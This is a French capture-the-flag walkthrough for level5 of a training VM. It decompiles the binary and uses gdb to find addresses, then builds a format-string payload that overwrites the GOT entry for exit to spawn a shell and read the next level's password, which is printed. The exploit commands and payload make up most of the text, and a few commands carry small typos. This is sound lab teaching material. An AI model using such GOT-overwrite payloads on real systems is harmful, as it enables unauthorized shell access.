# LEVEL 5
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `level6`.

1. Une fois connecté à la VM sur le `level5`, l'on retrouve un fichier `level5` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet :

	```sh
	> scp -P 4242 level5@127.0.0.1:level5 /path/on/machine/host
	```

2. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>
	#include <unistd.h>
	#include <sys/types.h>

	void o(void)
	{
		system("/bin/sh");
		exit(EXIT_FAILURE);
	}

	void n(void)
	{
		char local_20c[520];

		fgets(local_20c, 512, stdin); # 0x200 = 512 decimal
		printf(local_20c);
		exit(EXIT_FAILURE);
	}

	void main(void)
	{
		n();
		return;
	}
	```

	À partir de ce désassemblage, on en déduit que le programme contient 3 fonctions : la fonction `main`, la fonction `n` et la fonction `o` qui, tout trois, ne prennent aucun paramètre.

	La fonction `main` appelle tout simplement la fonction `n`. La fonction `n`, elle, lit une ligne de texte depuis l'entrée standard, soit `stdin`, dans un variable tampon `local_20c` et utilise `printf` pour l'afficher. En ce qui concerne La fonction `o`, celle-ci exécute la commande `système /bin/sh` pour ouvrir un shell interactif et `exit` le programme après.

	On constate 3 choses :
	- Dans un premier temps, la fonction `o` n'est ni appelée par la fonction `main` ni par `n` ;
	- Dans un deuxième temps, la fonction `printf` utilisée dans la fonction `n` n'utilise pas des spécificateurs de format, ce qui signifie que le contenu du tampon est interprété comme un format et cela peut donc être exploité.
	- Enfin, l'utilisation de la commande `système /bin/sh` dans la fonction `o` peut également être une vulnérabilité de sécurité si elle est accessible sans autorisation.

	En résumé, ce code est vulnérable aux attaques de format string, et il comporte une commande système potentiellement dangereuse qui peut être exploité par un attaquant pour obtenir un accès non autorisé au système.

5. L'idée ici est donc d'utiliser les vulnérabilités de la fonction `prinft` dans la fonction `n` afin d'appeler la fonction `o` en `buffer overflow` le `exit` de la fonction `n` et de lancer un shell interactif pour `cat` le fichier contenant le mot de passe du niveau suivant, soit `/home/user/level6/.pass`.

5. Pour cela, on va en premier trouver l'adresse de la fonction `o` : on lance donc `dgb` sur l'exécutable `level5` et on effectue la commande `info function`.

	```sh
    > gdb level5
    > info function
    [...]
		0x080484a4  o
		0x080484c2  n
		0x08048504  main
	[...]
    ```

6. Maintenant, on va trouver l'adresse de la fonction `exit` dans la fonction `n`. De ce fait, toujours dans `gdb level5`, on effectue un `disas` de la fonction `n` pour trouver l'adresse de la fonction `exit` dans la Procedure Linkage Table (PLT) pour de nouveau effectuer un `disas` sur cette adresse et obtenir l'adresse de la fonction `exit` dans `n`.

    ```sh
    > gdb level5
    > disas n
    Dump of assembler code for function n:
		0x080484c2 <+0>:	push   %ebp
		0x080484c3 <+1>:	mov    %esp,%ebp
		0x080484c5 <+3>:	sub    $0x218,%esp
		0x080484cb <+9>:	mov    0x8049848,%eax
		0x080484d0 <+14>:	mov    %eax,0x8(%esp)
		0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
		0x080484dc <+26>:	lea    -0x208(%ebp),%eax
		0x080484e2 <+32>:	mov    %eax,(%esp)
		0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
		0x080484ea <+40>:	lea    -0x208(%ebp),%eax
		0x080484f0 <+46>:	mov    %eax,(%esp)
		0x080484f3 <+49>:	call   0x8048380 <printf@plt>
		0x080484f8 <+54>:	movl   $0x1,(%esp)
		0x080484ff <+61>:	call   0x80483d0 <exit@plt>
	End of assembler dump.
	> disas 0x80483d0
	Dump of assembler code for function exit@plt:
		0x080483d0 <+0>:     jmp    *0x8049838
		0x080483d6 <+6>:     push   $0x28
		0x080483db <+11>:    jmp    0x8048370
	End of assembler dump.
    ```

    Ainsi, on obtient l'adresse `0x8049838` pour la fonction `exit` dans la GOT (Globat Offset Table). On on va donc remplacer l'adresse de `exit`, soit `0x8049838`, par l'adresse de `o` qui est `0x080484a4`. Ainsi, la fonction `n` en voulant exécuter `exit` exécutera `o`.

    Pour information :
    - PLT, Procedure Linkage Table : Structure utilisée pour appeler des fonctions externes ;
    - GOT, Globat Offset Table : Table qui indexe pour chaque fonction externe ou variable global externe son adresse globale.

7. Avant de créer la payload nécessaire pour exploiter cette vulnérabilité, il est essentiel de déterminer l'offset requis pour le `buffer overflow`. Pour ce faire, on va de nouveau exploiter l'une des vulnérabilités de la fonction `printf` afin de localiser l'emplacement de l'élément que l'on devra substituer lors de l'exploitation.

    ```sh
    > python -c "print 'AAAA' + ' %x ' * 24" | ./level4`
	AAAA 200  b7fd1ac0  b7ff37d0  41414141  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520
    ```

    En conséquence, on identifie que l'élément à exploiter est à la 4e position, car l'adresse correspondante à `AAAA` est `41414141`.

8. Maintenant, que l'on a les adresses de la fonction `exit` au sein de `n`, l'adresse la fonction `o` et l'emplacement de l'élément à exploiter, on peut générer la payload ci-dessous.

    ```sh
    > python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/payload5
    ```
    On a :
	- `\x38\x98\x04\x08` : L'adresse de la fonction `exit` dans `n` en format little-endian ;
	- `%134513824d`: L'adresse de la fonction `o` en decimal dans le flag `printf` `%d` ;

	- `%4`: L'emplacement de la 4e adresse dans la stack, soit celle de la fonction `exit` ;
	- `$n`: Le flag permettant de calculer le nombre de caractère stocké a cette adresse.

	De ce fait, on met la valeur `134513824` - soit l'adresse de la fonction `o`, à place de la fonction `exit` dans la fonction `n`.

9. À présent, il suffit simplement d'utiliser la chaîne de caractère précédemment généré afin d'exploiter les vulnérabilités de l'exécutable `level5`. En exploitant `level5` de cette manière, on s'assure que la fonction `o` est bien appelé et, ainsi, qu'un shell interactif est bien lancé. Il manque plus qu'à verifier que l'utilisateur a bien changé de `level5` à `level6` en utilisant la commande `whoami` et de `cat` le fichier contenant le mot de passe du `level6`, soit le fichier `/home/user/level6/.pass`.

    ```sh
	> cat /tmp/payload5 - | ./level5
	> whoami
	level6
	> cat /home/user/level6/.pass
	d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
	```

6. On peut à présent passer au niveau supérieur en exécutant la commande `su level6` et en y spécifiant le mot de passe qui vient d'être trouvée.

    ```sh
    > su level6
    Password :
	> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
    ```
